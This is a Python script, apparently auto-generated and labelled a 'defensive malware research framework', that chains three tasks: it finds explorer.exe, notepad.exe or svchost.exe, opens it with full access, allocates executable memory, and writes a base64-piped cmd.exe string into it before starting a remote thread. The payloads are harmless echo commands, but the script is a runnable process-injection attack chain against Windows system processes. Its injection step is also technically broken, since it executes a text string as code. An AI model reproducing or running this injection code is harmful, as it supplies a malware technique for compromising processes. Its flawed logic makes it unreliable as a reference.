#!/usr/bin/env python3
"""Merged modules for defensive malware research framework."""
import sys
import json
import time
import ctypes
import psutil
import subprocess
import base64
from typing import Dict, Any
from subprocess import run, CalledProcessError

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40
    size = 1024  # Allocate 1KB of memory

    try:
        # Step 1: Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.info['pid']
                break

        if target_pid is None:
            # Fallback to self-injection
            target_pid = ctypes.windll.kernel32.GetCurrentProcess()
            injection_success = False
        else:
            injection_success = True

        # Step 2: Allocate memory in target process
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            raise Exception("Failed to open process")

        allocated_address = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if not allocated_address:
            raise Exception("Failed to allocate memory")

        # Step 3: Execute a command using cmd.exe
        cmd_result = subprocess.run(['cmd.exe', '/c', 'echo Memory allocated'], capture_output=True, text=True, timeout=5)
        if cmd_result.returncode != 0:
            raise Exception("Failed to execute command with cmd.exe")

        result = {
            'process_handle': process_handle,
            'allocated_address': allocated_address,
            'size': size
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

    except Exception as e:
        # Return partial result on failure
        result = {
            'process_handle': 0,
            'allocated_address': 0,
            'size': 0
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    success = False
    injection_success = True

    try:
        # Step 1: Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.info['pid']
                break

        if target_pid is None:
            # Fallback to self-injection
            target_pid = ctypes.windll.kernel32.GetCurrentProcess()
            injection_success = False

        # Step 2: Prepare for injection
        process_handle = input_data.get('process_handle')
        allocated_address = input_data.get('allocated_address')
        size = input_data.get('size')

        # Base64-encoded command to inject
        command = "echo Hello from injected command!"
        encoded_command = base64.b64encode(command.encode()).decode()

        # Use cmd.exe to execute the command
        cmd_command = f"cmd.exe /c echo {encoded_command} | base64 -d | cmd.exe"
        
        # Step 3: Perform the injection
        PROCESS_ALL_ACCESS = 0x1F0FFF
        kernel32 = ctypes.windll.kernel32

        # Open the target process
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_process:
            raise Exception("Failed to open target process")

        # Allocate memory in the target process
        remote_memory = kernel32.VirtualAllocEx(h_process, 0, size, 0x3000, 0x40)
        if not remote_memory:
            raise Exception("Failed to allocate memory in target process")

        # Write the command to the allocated memory
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_process, remote_memory, cmd_command.encode(), len(cmd_command), ctypes.byref(written)):
            raise Exception("Failed to write to process memory")

        # Create a remote thread to execute the command
        if not kernel32.CreateRemoteThread(h_process, None, 0, remote_memory, None, 0, None):
            raise Exception("Failed to create remote thread")

        success = True

    except Exception as e:
        success = False
        injection_success = False

    finally:
        return {'success': success, 'data': {'injection_success': injection_success},
                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'command_executed': False, 'exit_code': -1}
    
    try:
        # Check if the previous stage was successful
        if input_data.get('success', False):
            # Example decoded command to execute
            command = "echo Hello, World!"

            # Execute the command using subprocess.Popen
            process = subprocess.Popen(['cmd.exe', '/c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            # Check the return code
            if process.returncode == 0:
                result['command_executed'] = True
                result['exit_code'] = process.returncode
            else:
                # Log the error but do not raise
                print(f"Command execution failed with return code {process.returncode}: {stderr.decode().strip()}")
                result['exit_code'] = process.returncode

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Allocate Memory in Target Process [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Allocate Memory in Target Process): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Allocate Memory in Target Process): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Inject Base64-Encoded Command [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Inject Base64-Encoded Command): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Inject Base64-Encoded Command): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Decode and Execute Command [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Decode and Execute Command): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Decode and Execute Command): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result, ensure_ascii=False))